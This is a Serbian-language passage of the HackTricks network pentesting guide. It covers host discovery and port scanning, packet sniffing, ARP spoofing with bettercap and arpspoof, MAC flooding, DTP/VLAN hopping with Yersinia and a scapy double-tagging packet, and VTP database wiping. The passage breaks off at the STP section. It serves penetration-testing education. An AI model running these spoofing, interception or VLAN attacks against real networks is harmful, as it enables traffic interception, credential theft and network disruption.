# Testiranje mreÅ¾e

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Otkrivanje hostova sa spoljne strane

Ovo Ä‡e biti **kratko poglavlje** o tome kako pronaÄ‡i **IP adrese koje odgovaraju** sa **Interneta**.\
U ovoj situaciji imate neki **opseg IP adresa** (moÅ¾da Äak i nekoliko **opsega**) i samo Å¾elite da pronaÄ‘ete **koje IP adrese odgovaraju**.

### ICMP

Ovo je najlakÅ¡i i najbrÅ¾i naÄin da otkrijete da li je host dostupan ili ne.\
MoÅ¾ete pokuÅ¡ati da poÅ¡aljete neke **ICMP** pakete i **oÄekujete odgovore**. NajlakÅ¡i naÄin je jednostavno slanje **echo zahteva** i oÄekivanje odgovora. To moÅ¾ete uraditi koristeÄ‡i jednostavnu `ping` komandu ili koristeÄ‡i `fping` za **opsege**.\
TakoÄ‘e moÅ¾ete koristiti **nmap** da biste poslali druge vrste ICMP paketa (ovo Ä‡e izbeÄ‡i filtere za uobiÄajene ICMP echo zahtev-odgovor).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Otkrivanje TCP portova

Veoma je Äesto da se ustanovi da su sve vrste ICMP paketa filtrirane. Tada, sve Å¡to moÅ¾ete da uradite da biste proverili da li je host dostupan je da **pokuÅ¡ate da pronaÄ‘ete otvorene portove**. Svaki host ima **65535 portova**, pa ako imate "veliki" opseg, **ne moÅ¾ete** testirati da li je **svaki port** svakog hosta otvoren ili ne, to bi oduzelo previÅ¡e vremena.\
Zato vam je potreban **brzi skener portova** ([masscan](https://github.com/robertdavidgraham/masscan)) i lista **najÄeÅ¡Ä‡e koriÅ¡Ä‡enih portova:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
MoÅ¾ete izvrÅ¡iti ovaj korak i sa `nmap`, ali je sporiji i `nmap` ima problema sa identifikacijom dostupnih hostova.

### Otkrivanje HTTP porta

Ovo je samo otkrivanje TCP porta koje je korisno kada Å¾elite da se fokusirate na otkrivanje HTTP servisa:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Otkrivanje UDP porta

TakoÄ‘e moÅ¾ete pokuÅ¡ati da proverite da li je neki **UDP port otvoren** kako biste odluÄili da li treba da **posvetite viÅ¡e paÅ¾nje** odreÄ‘enom **hostu**. PoÅ¡to UDP servisi obiÄno **ne odgovaraju** sa **bilo kakvim podacima** na obiÄan prazan UDP probni paket, teÅ¡ko je reÄ‡i da li je port filtriran ili otvoren. NajlakÅ¡i naÄin da se to utvrdi je slanje paketa koji je povezan sa pokrenutim servisom, a poÅ¡to ne znate koji servis je pokrenut, trebali biste probati najverovatniji na osnovu broja porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linija nmap koja je predloÅ¾ena ranije Ä‡e testirati **1000 najÄeÅ¡Ä‡e koriÅ¡Ä‡enih UDP portova** na svakom hostu unutar opsega **/24**, ali Äak i to Ä‡e trajati **>20 minuta**. Ako vam trebaju **najbrÅ¾i rezultati**, moÅ¾ete koristiti [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Ovo Ä‡e poslati ove **UDP probe** na njihove **oÄekivane portove** (za opseg /24 Ä‡e trajati samo 1 minut): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Otkrivanje SCTP portova
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentestiranje Wifi-a

Ovde moÅ¾ete pronaÄ‡i lep vodiÄ za sve poznate napade na Wifi u vreme pisanja:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Otkrivanje hostova iznutra

Ako se nalazite unutar mreÅ¾e, jedna od prvih stvari koje Ä‡ete Å¾eleti da uradite je da **otkrijete druge hostove**. Zavisno od **koliko buke** Å¾elite/hoÄ‡ete da napravite, mogu se izvrÅ¡iti razliÄite radnje:

### Pasivno

MoÅ¾ete koristiti ove alate za pasivno otkrivanje hostova unutar povezane mreÅ¾e:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktivno

Imajte na umu da se tehnike opisane u [_**Otkrivanje hostova sa spoljne strane**_](./#otkrivanje-hostova-sa-spoljne-strane) (_Otkrivanje TCP/HTTP/UDP/SCTP portova_) takoÄ‘e mogu **primeniti ovde**.\
MeÄ‘utim, poÅ¡to se nalazite u **istoj mreÅ¾i** kao i ostali hostovi, moÅ¾ete uraditi **viÅ¡e stvari**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktivni ICMP

Imajte na umu da se tehnike koje su komentarisane u odeljku _Otkrivanje hostova sa spoljne strane_ ([_**ICMP**_](./#icmp)) mogu **primeniti i ovde**.\
Ali, poÅ¡to se nalazite u **istoj mreÅ¾i** kao i ostali hostovi, moÅ¾ete uraditi **viÅ¡e stvari**:

* Ako **pingujete** adresu **subnet broadcasta**, ping bi trebao da stigne do **svakog hosta** i oni bi mogli da **odgovore** vama: `ping -b 10.10.5.255`
* Pingovanjem **broadcast adrese mreÅ¾e** Äak moÅ¾ete pronaÄ‡i hostove unutar **drugih subnetova**: `ping -b 255.255.255.255`
* Koristite opcije `-PE`, `-PP`, `-PM` naredbe `nmap` za otkrivanje hostova slanjem odgovarajuÄ‡ih zahteva za **ICMPv4 echo**, **timestamp** i **subnet masku**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Budjenje preko mreÅ¾e (Wake On Lan)**

Budjenje preko mreÅ¾e (Wake On Lan) se koristi za **ukljuÄivanje** raÄunara putem **mreÅ¾ne poruke**. ÄŒarobni paket koji se koristi za ukljuÄivanje raÄunara je samo paket u kojem je navedena **MAC adresa odrediÅ¡ta** i zatim se **16 puta ponavlja** unutar istog paketa.\
Ovakvi paketi se obiÄno Å¡alju u **ethernet 0x0842** ili u **UDP paket na port 9**.\
Ako nije navedena **\[MAC]** adresa, paket se Å¡alje na **broadcast ethernet** (i broadcast MAC adresa Ä‡e biti ona koja se ponavlja).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skeniranje Hostova

Kada ste otkrili sve IP adrese (spoljne ili unutraÅ¡nje) koje Å¾elite detaljno skenirati, moÅ¾ete izvrÅ¡iti razliÄite akcije.

### TCP

* **Otvoren** port: _SYN --> SYN/ACK --> RST_
* **Zatvoren** port: _SYN --> RST/ACK_
* **Filtriran** port: _SYN --> \[BEZ ODGOVORA]_
* **Filtriran** port: _SYN --> ICMP poruka_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Postoje 2 opcije za skeniranje UDP porta:

* PoÅ¡aljite **UDP paket** i proverite odgovor _**ICMP nedostupan**_ ako je port **zatvoren** (u nekim sluÄajevima ICMP Ä‡e biti **filtriran** pa neÄ‡ete dobiti nikakve informacije ako je port zatvoren ili otvoren).
* PoÅ¡aljite **formatirane datagrame** da biste izazvali odgovor od **servisa** (npr. DNS, DHCP, TFTP i drugi, kao Å¡to je navedeno u _nmap-payloads_). Ako dobijete **odgovor**, tada je port **otvoren**.

**Nmap** Ä‡e **meÅ¡ati obe** opcije koristeÄ‡i "-sV" (UDP skeniranja su veoma spora), ali imajte na umu da su UDP skeniranja sporija od TCP skeniranja:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Skeniranje

**SCTP (Stream Control Transmission Protocol)** je dizajniran da se koristi zajedno sa **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Njegova glavna svrha je olakÅ¡avanje prenosa telefonskih podataka preko IP mreÅ¾a, oponaÅ¡ajuÄ‡i mnoge od karakteristika pouzdanosti koje se nalaze u **Signaling System 7 (SS7)**. **SCTP** je osnovna komponenta porodiÄnog protokola **SIGTRAN**, koji ima za cilj prenos SS7 signala preko IP mreÅ¾a.

PodrÅ¡ka za **SCTP** je obezbeÄ‘ena od strane razliÄitih operativnih sistema, kao Å¡to su **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, Å¡to ukazuje na njegovo Å¡iroko prihvatanje i korisnost u oblasti telekomunikacija i mreÅ¾nog povezivanja.

Nmap nudi dva razliÄita skeniranja za SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evidencija IDS i IPS-a

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **ViÅ¡e opcija za nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Otkrivanje internih IP adresa

**Nekonfigurisani ruteri, firewall-i i mreÅ¾ni ureÄ‘aji** ponekad odgovaraju na mreÅ¾ne upite koristeÄ‡i **nejavne izvorne adrese**. **tcpdump** se moÅ¾e koristiti za identifikaciju paketa primljenih sa privatnih adresa tokom testiranja. Konkretno, na Kali Linux-u, paketi se mogu uhvatiti na **eth2 interfejsu**, koji je dostupan sa javnog interneta. VaÅ¾no je napomenuti da Ä‡e, ako je vaÅ¡a konfiguracija iza NAT-a ili firewall-a, takvi paketi verovatno biti filtrirani.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Snifovanje

Snifovanjem moÅ¾ete saznati detalje o IP opsezima, veliÄinama podmreÅ¾a, MAC adresama i imenima hostova pregledanjem uhvaÄ‡enih frejmova i paketa. Ako je mreÅ¾a loÅ¡e konfigurisana ili ako je prekidaÄ pod stresom, napadaÄi mogu uhvatiti osetljive podatke putem pasivnog snifovanja mreÅ¾e.

Ako je prekidaÄ u Ethernet mreÅ¾i pravilno konfigurisan, videÄ‡ete samo emitovane frejmove i materijal namenjen vaÅ¡oj MAC adresi.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
TakoÄ‘e, moguÄ‡e je snimati pakete sa udaljenog raÄunara preko SSH sesije koristeÄ‡i Wireshark kao grafiÄki interfejs u realnom vremenu.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap

Bettercap je moÄ‡an alat za mreÅ¾no pentestiranje koji pruÅ¾a razne funkcionalnosti za analizu i manipulaciju mreÅ¾nog saobraÄ‡aja. Ovaj alat omoguÄ‡ava hakere da izvrÅ¡e razliÄite napade na mreÅ¾u, kao Å¡to su presretanje paketa, DNS spoofing, ARP spoofing i mnoge druge tehnike.

#### Instalacija

Da biste instalirali Bettercap, pratite sledeÄ‡e korake:

1. Prvo, instalirajte Go programski jezik na svom sistemu.
2. Zatim, klonirajte Bettercap repozitorijum sa GitHub-a.
3. UÄ‘ite u direktorijum repozitorijuma i pokrenite `make build` komandu.
4. Nakon zavrÅ¡etka kompilacije, pokrenite `make install` komandu da biste instalirali Bettercap.

#### Upotreba

Bettercap se moÅ¾e koristiti za razliÄite svrhe, ukljuÄujuÄ‡i:

- Presretanje mreÅ¾nog saobraÄ‡aja: Bettercap moÅ¾e presretati mreÅ¾ni saobraÄ‡aj izmeÄ‘u ureÄ‘aja i rutera, omoguÄ‡avajuÄ‡i hakerima da prate i analiziraju komunikaciju.
- DNS spoofing: Ovaj alat omoguÄ‡ava hakere da izvrÅ¡e DNS spoofing napade, preusmeravajuÄ‡i DNS upite na laÅ¾ne IP adrese.
- ARP spoofing: Bettercap moÅ¾e izvrÅ¡iti ARP spoofing napade, laÅ¾irajuÄ‡i ARP odgovore i preusmeravajuÄ‡i mreÅ¾ni saobraÄ‡aj na hakerov ureÄ‘aj.
- SSL/TLS interseptacija: Alat podrÅ¾ava interseptaciju SSL/TLS saobraÄ‡aja, omoguÄ‡avajuÄ‡i hakerima da deÅ¡ifruju enkriptovane podatke.

#### ZakljuÄak

Bettercap je moÄ‡an alat za mreÅ¾no pentestiranje koji pruÅ¾a razne funkcionalnosti za analizu i manipulaciju mreÅ¾nog saobraÄ‡aja. KoriÅ¡Ä‡enje ovog alata zahteva odgovornost i etiÄko postupanje, jer moÅ¾e biti zloupotrebljen za neovlaÅ¡Ä‡ene aktivnosti.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

OÄigledno.

### Snimanje akreditacija

MoÅ¾ete koristiti alate poput [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) za parsiranje akreditacija iz pcap datoteke ili sa Å¾ivog interfejsa.

## Napadi na LAN mreÅ¾u

### ARP spoofing

ARP spoofing se sastoji od slanja laÅ¾nih ARP odgovora kako bi se naznaÄilo da IP adresa odreÄ‘enog ureÄ‘aja ima MAC adresu naÅ¡eg ureÄ‘aja. Zatim, Å¾rtva Ä‡e promeniti ARP tabelu i kontaktiraÄ‡e naÅ¡ ureÄ‘aj svaki put kada Å¾eli da kontaktira IP adresu koja je laÅ¾irana.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof je alat koji omoguÄ‡ava napadaÄu da laÅ¾ira ARP odgovore i preusmerava mreÅ¾ni saobraÄ‡aj. Ovo omoguÄ‡ava napadaÄu da izvede napade kao Å¡to su Man-in-the-Middle (MitM) i sniffing mreÅ¾nog saobraÄ‡aja. Arpspoof koristi ARP protokol za manipulaciju ARP tabela na ciljnom raÄunaru i usmerava saobraÄ‡aj preko napadaÄevog raÄunara. Ovo omoguÄ‡ava napadaÄu da presretne, modifikuje ili prisluÅ¡kuje mreÅ¾ni saobraÄ‡aj izmeÄ‘u dve komunikacijske strane.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Poplavljanje - PrekoraÄenje CAM tabele

PrekoraÄite CAM tabelu prekidaÄa slanjem velikog broja paketa sa razliÄitim izvornim MAC adresama. Kada je CAM tabela puna, prekidaÄ poÄinje da se ponaÅ¡a kao hub (emituje sav saobraÄ‡aj).
```bash
macof -i <interface>
```
U modernim prekidaÄima ova ranjivost je ispravljena.

### Napadi na 802.1Q VLAN / DTP

#### DinamiÄko trunkiranje

**Protokol dinamiÄkog trunkiranja (DTP)** je dizajniran kao protokol sloja veze kako bi olakÅ¡ao automatski sistem za trunkiranje, omoguÄ‡avajuÄ‡i prekidaÄima da automatski odaberu portove za trunk reÅ¾im (Trunk) ili ne-trunk reÅ¾im. Implementacija **DTP**-a Äesto se smatra indikativnom za suboptimalni dizajn mreÅ¾e, naglaÅ¡avajuÄ‡i vaÅ¾nost ruÄnog konfigurisanja trunkova samo tamo gde je to potrebno i obezbeÄ‘ivanja odgovarajuÄ‡e dokumentacije.

Prema zadanim podeÅ¡avanjima, portovi prekidaÄa su podeÅ¡eni da rade u reÅ¾imu DinamiÄki Auto, Å¡to znaÄi da su spremni da pokrenu trunkiranje ako ih podstakne susedni prekidaÄ. Bezbednosna zabrinutost se javlja kada pentester ili napadaÄ poveÅ¾e se na prekidaÄ i poÅ¡alje DTP Desirable okvir, prisiljavajuÄ‡i port da uÄ‘e u trunk reÅ¾im. Ova akcija omoguÄ‡ava napadaÄu da nabroji VLAN-ove kroz analizu STP okvira i zaobiÄ‘e segmentaciju VLAN-ova postavljanjem virtuelnih interfejsa.

Prisustvo DTP-a u mnogim prekidaÄima po zadanim podeÅ¡avanjima moÅ¾e biti iskoriÅ¡Ä‡eno od strane protivnika kako bi imitirali ponaÅ¡anje prekidaÄa, Äime dobijaju pristup saobraÄ‡aju preko svih VLAN-ova. Skripta [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se koristi za praÄ‡enje interfejsa, otkrivajuÄ‡i da li je prekidaÄ u reÅ¾imu Podrazumevano, Trunk, DinamiÄki, Auto ili Pristup - poslednja konfiguracija je jedina imuna na napade VLAN hopping-a. Ovaj alat procenjuje ranjivost prekidaÄa.

Ukoliko se identifikuje ranjivost mreÅ¾e, moÅ¾e se koristiti alat _**Yersinia**_ za "omoguÄ‡avanje trunkiranja" putem DTP protokola, Å¡to omoguÄ‡ava posmatranje paketa sa svih VLAN-ova.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Da biste nabrojali VLAN-ove, takoÄ‘e je moguÄ‡e generisati DTP Desirable okvir pomoÄ‡u skripte [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**e prekidajte skriptu ni pod kojim okolnostima. Ona ubacuje DTP Desirable svake tri sekunde. **DinamiÄki kreirani trunk kanali na prekidaÄu Å¾ive samo pet minuta. Nakon pet minuta, trunk se prekida.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Å½elim da naglasim da **Pristup/PoÅ¾eljan (0x03)** ukazuje da je DTP okvir tipa PoÅ¾eljan, Å¡to govori portu da preÄ‘e u Trunk reÅ¾im. A **802.1Q/802.1Q (0xa5**) ukazuje na tip inkapsulacije **802.1Q**.

Analizom STP okvira, **saznajemo o postojanju VLAN-a 30 i VLAN-a 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Napad na odreÄ‘ene VLAN-ove

Kada saznate VLAN ID-ove i vrednosti IP adresa, moÅ¾ete **konfigurisati virtuelno suÄelje za napad na odreÄ‘eni VLAN**.\
Ako DHCP nije dostupan, koristite _ifconfig_ za podeÅ¡avanje statiÄke IP adrese.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatski VLAN Hopper

Opisani napad na **DinamiÄko Trunkovanje i kreiranje virtuelnih interfejsa i otkrivanje hostova unutar** drugih VLAN-ova se **automatski izvodi** pomoÄ‡u alata: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Dvostruko oznaÄavanje

Ako napadaÄ zna vrednost **MAC, IP i VLAN ID Å¾rtvinog hosta**, moÅ¾e pokuÅ¡ati da **dvostruko oznaÄi okvir** sa svojom odreÄ‘enom VLAN-om i VLAN-om Å¾rtve i poÅ¡alje paket. PoÅ¡to **Å¾rtva neÄ‡e moÄ‡i da se poveÅ¾e nazad** sa napadaÄem, najbolja opcija za napadaÄa je komunikacija putem UDP-a sa protokolima koji mogu izvrÅ¡iti neke zanimljive akcije (kao Å¡to je SNMP).

Druga opcija za napadaÄa je da pokrene **TCP port skeniranje sa laÅ¾iranim IP-jem kontrolisanim od strane napadaÄa i dostupnim Å¾rtvi** (verovatno preko interneta). Zatim, napadaÄ moÅ¾e prisluÅ¡kivati na drugom hostu koji je u njegovom vlasniÅ¡tvu da li prima pakete od Å¾rtve.

![](<../../.gitbook/assets/image (635) (1).png>)

Za izvoÄ‘enje ovog napada moÅ¾ete koristiti scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypassiranje segmentacije VLAN-a na boÄnoj strani <a href="#d679" id="d679"></a>

Ako imate **pristup prekidaÄu s kojim ste direktno povezani**, imate moguÄ‡nost **bypassiranja segmentacije VLAN-a** unutar mreÅ¾e. Jednostavno **prebacite port u reÅ¾im trunka** (poznat i kao trunk), kreirajte virtuelne interfejse sa ID-ovima ciljnih VLAN-ova i konfiguriÅ¡ite IP adresu. MoÅ¾ete pokuÅ¡ati da zatraÅ¾ite adresu dinamiÄki (DHCP) ili je moÅ¾ete konfigurisati statiÄki. To zavisi od sluÄaja.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypassiranje privatne VLAN segmentacije na sloju 3

U odreÄ‘enim okruÅ¾enjima, kao Å¡to su gostujuÄ‡e beÅ¾iÄne mreÅ¾e, postavke **izolacije porta (poznate i kao privatne VLAN)** se primenjuju kako bi se spreÄilo direktno komuniciranje klijenata koji su povezani sa beÅ¾iÄnom taÄkom pristupa. MeÄ‘utim, identifikovana je tehnika koja moÅ¾e zaobiÄ‡i ove mere izolacije. Ova tehnika iskoriÅ¡Ä‡ava nedostatak ACL-ova u mreÅ¾i ili njihovu nepravilnu konfiguraciju, omoguÄ‡avajuÄ‡i IP paketima da budu rutirani preko rutera kako bi stigli do drugog klijenta u istoj mreÅ¾i.

Napad se izvodi tako Å¡to se kreira **paketa koji nosi IP adresu odrediÅ¡nog klijenta, ali sa MAC adresom rutera**. To dovodi do toga da ruter greÅ¡kom prosleÄ‘uje paket ciljnom klijentu. Ovaj pristup je sliÄan onome koji se koristi u napadima sa dvostrukim oznaÄavanjem, gde se koristi moguÄ‡nost kontrole hosta koji je dostupan Å¾rtvi kako bi se iskoristila bezbednosna slabost.

**KljuÄni koraci napada:**
1. **Kreiranje paketa:** Paket se posebno kreira tako da sadrÅ¾i IP adresu ciljnog klijenta, ali sa MAC adresom rutera.
2. **IskoriÅ¡Ä‡avanje ponaÅ¡anja rutera:** Kreirani paket se Å¡alje do rutera koji, zbog konfiguracije, preusmerava paket ciljnom klijentu, zaobilazeÄ‡i izolaciju koju pruÅ¾aju postavke privatne VLAN segmentacije.

### Napadi na VTP

VTP (VLAN Trunking Protocol) centralizuje upravljanje VLAN-ovima. Koristi revizijske brojeve za odrÅ¾avanje integriteta baze podataka VLAN-ova; svaka izmena poveÄ‡ava ovaj broj. PrekidaÄi usvajaju konfiguracije sa veÄ‡im revizijskim brojevima, aÅ¾urirajuÄ‡i svoje vlastite baze podataka VLAN-ova.

#### Uloge VTP domena

- **VTP server:** Upravlja VLAN-ovima - kreira, briÅ¡e, menja. Emituje VTP obaveÅ¡tenja Älanovima domena.
- **VTP klijent:** Prima VTP obaveÅ¡tenja radi sinhronizacije svoje baze podataka VLAN-ova. Ova uloga je ograniÄena od lokalnih izmena konfiguracije VLAN-a.
- **VTP Transparent:** Ne uÄestvuje u VTP aÅ¾uriranjima, ali prosleÄ‘uje VTP obaveÅ¡tenja. Nezavisan od VTP napada, odrÅ¾ava konstantan revizijski broj nula.

#### Tipovi VTP obaveÅ¡tenja

- **SaÅ¾eto obaveÅ¡tenje:** Emituje ga VTP server svakih 300 sekundi, noseÄ‡i osnovne informacije o domenu.
- **Podskup obaveÅ¡tenja:** Slanje nakon promena u konfiguraciji VLAN-a.
- **Zahtev za obaveÅ¡tenje:** Izdaje ga VTP klijent kako bi zatraÅ¾io saÅ¾eto obaveÅ¡tenje, obiÄno kao odgovor na otkrivanje veÄ‡eg revizijskog broja konfiguracije.

Ranjivosti VTP-a se mogu iskoristiti iskljuÄivo putem trunk portova, jer se VTP obaveÅ¡tenja kruÅ¾e samo kroz njih. Scenariji napada nakon DTP-a mogu se usmeriti ka VTP-u. Alati poput Yersinie mogu olakÅ¡ati VTP napade, sa ciljem brisanja baze podataka VLAN-ova i efektivnog ometanja mreÅ¾e.

Napomena: Ova diskusija se odnosi na VTP verziju 1 (VTPv1).
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
U grafiÄkom reÅ¾imu Yersinie, izaberite opciju brisanja svih VTP VLAN-ova kako biste oÄistili VLAN bazu podataka.


### Napadi na STP

**Ako ne moÅ¾ete snimati BPDU okvire na svojim interfejsima, malo je verovatno da Ä‡ete uspeti u napadu na STP.**

#### **STP BPDU DoS**

